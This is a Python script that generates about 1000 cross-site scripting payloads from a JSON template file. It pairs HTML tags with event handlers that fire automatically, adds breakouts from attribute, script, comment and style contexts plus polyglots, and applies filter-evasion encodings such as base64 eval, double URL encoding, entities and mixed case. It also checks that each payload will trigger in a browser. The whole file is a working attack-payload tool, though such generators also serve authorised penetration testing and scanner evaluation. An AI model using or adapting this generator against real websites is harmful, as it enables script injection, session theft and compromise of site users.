#!/usr/bin/env python3
"""
XSS Payload Generator v9 — Breakout-Aware, Exactly 1000 Payloads.

Adds first-class breakout sequences:
  - Attribute breakouts  (close quote/tag, inject event handler or script)
  - Script context       (close </script>, escape JS string, template literal)
  - Comment breakouts    (close --> or */ to reopen parser)
  - Style/title/textarea (close container tag)
  - Polyglots            (fire in multiple unknown contexts)

Two-layer validation:
  Layer 1 (trigger): will the event actually fire?
  Layer 2 (syntax):  is the payload structurally well-formed?

Output contract: strictly printable ASCII, one payload per line, exactly
1000 payloads via per-context cap + random sampling.
"""
import json
import base64
import random
import re
import urllib.parse
import sys
import os

# ===========================================================================
# Constants
# ===========================================================================

CONTROL_CHARS_RE = re.compile(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]')

# Tags that inherently fire an event on load/render
AUTO_TRIGGER_EVENTS = {"onload", "onerror", "onfocus", "onbegin", "onend",
                       "ontoggle", "onstart", "onfinish", "onpageshow",
                       "onhashchange", "onpopstate", "onmessage"}

# Events that require user interaction
INTERACTION_EVENTS = {"onmouseover", "onmouseout", "onclick", "ondblclick",
                      "onmousedown", "onmouseup", "onmousemove", "onmouseenter",
                      "onmouseleave", "onkeydown", "onkeypress", "onkeyup",
                      "onwheel", "onpointerdown", "onpointerup", "onpointermove",
                      "onpointerenter", "onpointerleave", "onauxclick",
                      "oncontextmenu", "ondrag", "ondrop", "onscroll"}

# Tags whose event-attribute relation is well-known:
EVENT_TAG_ALLOW = {
    "onload":     {"img", "svg", "body", "input", "iframe", "video", "audio",
                   "object", "embed", "link", "script", "style"},
    "onerror":    {"img", "svg", "video", "audio", "object", "embed", "input",
                   "link", "script"},
    "onfocus":    {"input", "select", "textarea", "a", "button", "body",
                   "details", "iframe"},
    "onblur":     {"input", "select", "textarea", "a", "button"},
    "onabort":    {"img", "video", "audio"},
    "onscroll":   {"body", "div", "textarea"},
    "onchange":   {"input", "select", "textarea"},
    "onsubmit":   {"form"},
    "onreset":    {"form"},
    "onselect":   {"textarea", "input"},
    "ontoggle":   {"details"},
    # Media
    "oncanplay": {"video", "audio"}, "onended": {"video", "audio"},
    "onloadeddata": {"video", "audio"}, "onloadedmetadata": {"video", "audio"},
    "onloadstart": {"video", "audio"}, "onpause": {"video", "audio"},
    "onplay": {"video", "audio"}, "onplaying": {"video", "audio"},
    "onprogress": {"video", "audio"}, "ontimeupdate": {"video", "audio"},
    "onvolumechange": {"video", "audio"}, "onwaiting": {"video", "audio"},
    # Document/body
    "onafterprint": {"body"}, "onbeforeprint": {"body"},
    "onbeforeunload": {"body"}, "onhashchange": {"body"},
    "onmessage": {"body"}, "onoffline": {"body"}, "ononline": {"body"},
    "onpagehide": {"body"}, "onpageshow": {"body"},
    "onpopstate": {"body"}, "onstorage": {"body"}, "onunload": {"body"},
    "onresize": {"body"},
    # SVG animation
    "onbegin": set(), "onend": set(), "onrepeat": set(),
    # Everybody else
    "onmouseover": {"img", "svg", "body", "a", "input", "select", "textarea",
                    "details", "video", "audio", "object", "embed"},
    "onclick":     {"img", "svg", "body", "a", "input", "select", "textarea",
                    "details", "video", "audio", "object", "embed", "iframe"},
    "ondblclick":  {"img", "svg", "body", "a", "input", "select", "textarea",
                    "details", "video", "audio", "object", "embed"},
    "onkeydown":   {"input", "textarea", "select", "body"},
    "onkeypress":  {"input", "textarea", "select", "body"},
    "onkeyup":     {"input", "textarea", "select", "body"},
    "onmousedown": {"img", "svg", "body", "a", "input", "details"},
    "onmouseup":   {"img", "svg", "body", "a", "input", "details"},
    "onmousemove": {"img", "svg", "body", "a", "input", "details"},
    "onmouseenter": {"img", "svg", "body", "a", "input", "details"},
    "onmouseleave": {"img", "svg", "body", "a", "input", "details"},
    "onwheel":      {"body", "input", "textarea", "details"},
    "onpointerdown":  {"img", "svg", "body", "a", "input", "button"},
    "onpointerup":    {"img", "svg", "body", "a", "input", "button"},
    "onpointermove":  {"img", "svg", "body", "a", "input"},
    "onpointerenter": {"img", "svg", "body", "a", "input"},
    "onpointerleave": {"img", "svg", "body", "a", "input"},
    "onauxclick":     {"img", "svg", "body", "a", "input"},
    "oncontextmenu":  {"img", "svg", "body", "a", "input"},
    "ondrag":         {"img", "svg", "body", "a", "input"},
    "ondrop":         {"img", "svg", "body", "a", "input"},
    "ongotpointercapture":  {"img", "svg"},
    "onlostpointercapture": {"img", "svg"},
}

# Tags are always valid for all events in these groups — they're breakout
# templates where the "tag" is a marker, not a real HTML element.
BREAKOUT_GROUPS = {
    "breakout_attr", "breakout_script_ctx", "breakout_template",
    "breakout_comment", "breakout_style_ctx", "polyglot"
}

# ===========================================================================
# Base64 helpers
# ===========================================================================

def b64_encode(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

# ===========================================================================
# Substitution
# ===========================================================================

def substitute(template: str, subs: dict) -> str:
    """Simple key replacement — no format() to avoid brace conflicts."""
    result = template
    for key, val in subs.items():
        result = result.replace(key, val)
    return result

def build_call_str(func: dict) -> str:
    return f"{func['name']}({func['value']})"

# ===========================================================================
# Encoding application
# ===========================================================================

def apply_encoding(enc_config: dict, raw: str, call_str: str,
                   tag: str, event: str):
    """Yield one or more encoded variants of the payload."""
    transform = enc_config.get("transform", "none")
    apply_to = enc_config.get("apply_to", "raw")

    if transform == "none":
        yield raw
        return

    if apply_to == "full_payload":
        if transform == "url_encoded":
            yield urllib.parse.quote(raw, safe='')
        elif transform == "double_url_encoded":
            first = urllib.parse.quote(raw, safe='')
            yield urllib.parse.quote(first, safe='')
        elif transform == "html_entity_decimal":
            yield "".join(f"&#{ord(c)};" for c in raw)
        elif transform == "html_entity_hex":
            yield "".join(f"&#x{ord(c):x};" for c in raw)
        else:
            yield raw
        return

    if apply_to == "function_call":
        if transform == "base64_eval":
            b64 = b64_encode(call_str)
            yield raw.replace(call_str, f"eval(atob('{b64}'))")
        else:
            yield raw
        return

    if apply_to == "event_name":
        if transform == "mixed_case":
            mixed = "".join(c.upper() if random.random() < 0.5 else c
                           for c in event)
            yield raw.replace(event, mixed)
        else:
            yield raw
        return

    if apply_to == "tag_name":
        if transform == "mixed_case":
            mixed = "".join(c.upper() if random.random() < 0.5 else c
                           for c in tag)
            yield raw.replace(tag, mixed)
        else:
            yield raw
        return

    yield raw

# ===========================================================================
# Validation
# ===========================================================================

def validate_trigger(tag: str, event: str, payload: str,
                     drop_interaction_events: bool = True,
                     assume_media_src_valid: bool = False) -> tuple:
    """
    Returns (True, "") if the payload would plausibly fire in a browser,
    or (False, "reason") if it won't.
    """
    # Breakout groups are exempt from tag-vs-event matching
    if tag.startswith("break_") or tag == "poly":
        return True, ""

    if not event:
        return True, ""

    ev = event.lower()

    # Interaction-only events when dropped
    if drop_interaction_events and ev in INTERACTION_EVENTS:
        return False, "interaction_event"

    # SVG animation events need <animate>/<set>/<animateTransform>
    if ev in ("onbegin", "onend", "onrepeat"):
        if tag not in ("animate", "set", "animateTransform"):
            return False, "svg_anim_on_wrong_tag"
        return True, ""

    # Media events need src or autoplay
    if ev in ("oncanplay", "oncanplaythrough", "ondurationchange",
              "onemptied", "onended", "onloadeddata", "onloadedmetadata",
              "onloadstart", "onpause", "onplay", "onplaying",
              "onprogress", "onratechange", "onseeked", "onseeking",
              "onstalled", "onsuspend", "ontimeupdate", "onvolumechange",
              "onwaiting"):
        if tag not in ("video", "audio"):
            return False, "media_event_on_nonmedia"
        if not assume_media_src_valid:
            if 'src=' not in payload and 'autoplay' not in payload:
                return False, "media_no_src"
        return True, ""

    # Document/window events only on body
    if ev in ("onafterprint", "onbeforeprint", "onbeforeunload",
              "onhashchange", "onmessage", "onoffline", "ononline",
              "onpagehide", "onpageshow", "onpopstate", "onstorage",
              "onunload", "onresize"):
        if tag != "body":
            return False, f"{ev}_requires_body"
        return True, ""

    # Details-specific
    if ev == "ontoggle" and tag != "details":
        return False, "ontoggle_requires_details"

    # Auto-trigger events on appropriate tags
    allow_set = EVENT_TAG_ALLOW.get(ev)
    if allow_set is not None and tag not in allow_set:
        if allow_set:
            return False, f"{ev}_not_on_{tag}"
        # Empty set = no tags (pure JS context)
        return False, f"{ev}_no_native_support"

    return True, ""


def validate_syntax(payload: str, tag: str, event: str) -> tuple:
    """
    Returns (True, "") if the payload is structurally well-formed,
    or (False, "reason") if it's malformed.
    """
    # Breakout groups get minimal syntax checking
    if tag.startswith("break_") or tag == "poly":
        return True, ""

    # Check for balanced quotes in event-handler payloads
    if event:
        # Event attribute values must eventually close
        quote_chars = {'"': 0, "'": 0}
        in_val = False
        in_tag = False
        for c in payload:
            if c == '<':
                in_tag = True
            elif c == '>':
                in_tag = False
            elif c in quote_chars:
                if not in_tag:
                    quote_chars[c] += 1

        # Inside an HTML tag, odd number of quotes is usually fine
        # (the attribute value hasn't been closed yet).
        # We only flag if quotes are extremely mangled.
        total = sum(quote_chars.values())
        if total > 10:
            return False, "excessive_quotes"

    # No control characters
    if CONTROL_CHARS_RE.search(payload):
        return False, "control_chars"

    return True, ""


# ===========================================================================
# Context generation
# ===========================================================================

def generate_context(context_name: str, param: dict,
                     full_page_b64: str, options: dict):
    """
    Generate payloads for a single context.
    Returns (list_of_payloads, stats_dict).
    """
    tags_cfg = param["tags"]
    events_cfg = param.get("events", {})
    functions = param.get("functions", [])
    encodings = param.get("encodings", {})
    allow_contextual = param.get("allow_contextual_encodings", False)
    drop_interaction = not options.get("include_interaction_events", True)
    include_media = options.get("include_media_events", False)
    include_doc_body = options.get("include_document_body_events", False)
    include_anim = options.get("include_animation_svg_events", False)

    allowed_tag_groups = param["context_bindings"].get(context_name, [])

    # Flatten events
    all_events = []
    for cat, ev_list in events_cfg.items():
        if cat == "media" and not include_media:
            continue
        if cat == "document_body" and not include_doc_body:
            continue
        if cat == "animation_svg" and not include_anim:
            continue
        if cat == "extended" and drop_interaction:
            all_events.extend(e for e in ev_list if e not in INTERACTION_EVENTS)
        else:
            all_events.extend(ev_list)

    payloads = []
    stats = {
        "context": context_name,
        "skipped_tag_groups": 0,
        "trigger_invalid": 0,
        "syntax_invalid": 0,
        "syntax_reasons": {},
    }

    for tag_group_name, tag_group in tags_cfg.items():
        if tag_group_name not in allowed_tag_groups:
            stats["skipped_tag_groups"] += 1
            continue

        is_breakout = tag_group_name in BREAKOUT_GROUPS

        for tag in tag_group["list"]:
            for template in tag_group["templates"]:
                has_event = "{event}" in template
                event_iter = all_events if has_event else [""]

                for event in event_iter:
                    for func in functions:
                        call_str = build_call_str(func)
                        subs = {
                            "{tag}": tag,
                            "{event}": event if event else "",
                            "{function}": func["name"],
                            "{value}": func["value"],
                            "{base64}": b64_encode(call_str),
                            "{base64_full_page}": full_page_b64,
                        }
                        raw_payload = substitute(template, subs)

                        for enc_name, enc_config in encodings.items():
                            is_contextual = enc_config.get("apply_to") == "full_payload"
                            
                            # Skip contextual encodings if not allowed
                            if is_contextual and not allow_contextual:
                                continue

                            for p in apply_encoding(enc_config, raw_payload,
                                                     call_str, tag, event):
                                # Breakout payloads skip trigger validation
                                if not is_breakout:
                                    ok, reason = validate_trigger(
                                        tag, event, p,
                                        drop_interaction_events=drop_interaction,
                                        assume_media_src_valid=False)
                                    if not ok:
                                        stats["trigger_invalid"] += 1
                                        continue

                                ok, reason = validate_syntax(p, tag, event)
                                if not ok:
                                    stats["syntax_invalid"] += 1
                                    stats["syntax_reasons"][reason] = \
                                        stats["syntax_reasons"].get(reason, 0) + 1
                                    continue

                                payloads.append(p)

    return payloads, stats


# ===========================================================================
# Main
# ===========================================================================

def main():
    seed = os.environ.get("XSS_SEED")
    if seed:
        random.seed(int(seed))
    else:
        random.seed()  # Use system entropy

    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    json_path = os.path.join(BASE_DIR, "xss.json")

    if not os.path.exists(json_path):
        print(f"[!] Error: {json_path} not found")
        sys.exit(1)

    with open(json_path, "r", encoding="utf-8") as f:
        param = json.load(f)

    print(f"[*] Loaded {json_path}")
    print("[*] Generating XSS payloads (breakout-aware, target: ~1000)...")

    full_page_b64 = param.get("full_page_base64", "")
    options = param.get("generation_options", {})
    per_ctx_cap = options.get("max_payloads_per_context", 0)
    sample_size = options.get("random_sample_size", 0)

    all_payloads = []       # (payload, context_name)
    all_stats = []

    ctx_order = list(param["context_bindings"].keys())

    for ctx in ctx_order:
        ctx_payloads, ctx_stats = generate_context(
            ctx, param, full_page_b64, options)
        print(f"[+] Context '{ctx}': {len(ctx_payloads)} raw payloads "
              f"(dropped {ctx_stats['trigger_invalid']} trigger-invalid, "
              f"{ctx_stats['syntax_invalid']} syntax-invalid, "
              f"skipped {ctx_stats['skipped_tag_groups']} tag groups)")
        all_payloads.extend((p, ctx) for p in ctx_payloads)
        all_stats.append(ctx_stats)

    # Apply per-context cap AFTER encoding
    if per_ctx_cap > 0:
        # Group by context
        ctx_groups = {}
        for p, ctx in all_payloads:
            if ctx not in ctx_groups:
                ctx_groups[ctx] = []
            ctx_groups[ctx].append(p)
        
        # Cap each context group
        capped = []
        for ctx, payloads in ctx_groups.items():
            if len(payloads) > per_ctx_cap:
                # Randomly sample from each context
                sampled = random.sample(payloads, per_ctx_cap)
                capped.extend((p, ctx) for p in sampled)
            else:
                capped.extend((p, ctx) for p in payloads)
        all_payloads = capped
        print(f"[*] Per-context cap ({per_ctx_cap}): {len(all_payloads)} total")

    # --- Deduplicate ---
    seen = set()
    unique_payloads = []
    for p, ctx in all_payloads:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    print(f"[*] After dedup: {len(unique_payloads)} unique payloads")

    # --- Random sampling to exactly sample_size ---
    if sample_size and len(unique_payloads) > sample_size:
        unique_payloads = random.sample(unique_payloads, sample_size)
        print(f"[*] Random sampled to {len(unique_payloads)}")
    elif sample_size and len(unique_payloads) < sample_size:
        print(f"[*] Warning: Only {len(unique_payloads)} payloads generated, less than target {sample_size}")

    # --- Hard control-char filter ---
    blocked = [p for p in unique_payloads if CONTROL_CHARS_RE.search(p)]
    if blocked:
        print(f"[!] Safety filter removed {len(blocked)} payloads "
              f"containing control characters")
        unique_payloads = [p for p in unique_payloads
                          if not CONTROL_CHARS_RE.search(p)]

    print(f"[*] FINAL payload count: {len(unique_payloads)}")

    # Aggregate syntax drop reasons
    reasons = {}
    for s in all_stats:
        for r, c in s["syntax_reasons"].items():
            reasons[r] = reasons.get(r, 0) + c
    if reasons:
        print("[*] Syntax drop reasons (most common first):")
        for r, c in sorted(reasons.items(), key=lambda x: -x[1]):
            print(f"    {c:5d}x  {r}")

    # --- Write output ---
    output_file = os.path.join(BASE_DIR, "payloads.txt")
    with open(output_file, "w", encoding="utf-8", newline='\n') as f:  # Force Unix line endings
        for payload in unique_payloads:
            f.write(payload + "\n")

    print(f"[*] Written to {output_file}")

    # --- Self-check ---
    with open(output_file, "rb") as f:
        raw = f.read()
    
    # Decode and check lines
    try:
        text = raw.decode('utf-8')
        lines = text.splitlines()
    except UnicodeDecodeError:
        print("[!] Warning: File contains non-UTF-8 characters")
        lines = []
    
    # Check for control characters (excluding newline \x0a and \r which is handled by newline='\n')
    control_bytes = [b for b in raw if b < 0x09 or (b > 0x0a and b < 0x20) or b == 0x7f]
    
    # Check if we have the right number of lines
    line_count_ok = len(lines) == len(unique_payloads)
    no_extra_newlines = raw.count(b"\n") == len(unique_payloads)
    no_cr = b'\r' not in raw  # Should be true with newline='\n'
    
    contract_ok = line_count_ok and no_extra_newlines and not control_bytes and no_cr
    print(f"[*] Self-check: {len(lines)} lines vs {len(unique_payloads)} payloads, "
          f"{len(control_bytes)} control bytes, {'CR present' if b'\\r' in raw else 'no CR'} -> "
          f"{'PASS' if contract_ok else 'FAIL'}")

    if unique_payloads:
        print(f"[*] Sample payloads (first 10):")
        for i, s in enumerate(unique_payloads[:10]):
            display = s[:150] + '...' if len(s) > 150 else s
            print(f"  {i+1}. {display}")


if __name__ == "__main__":
    main()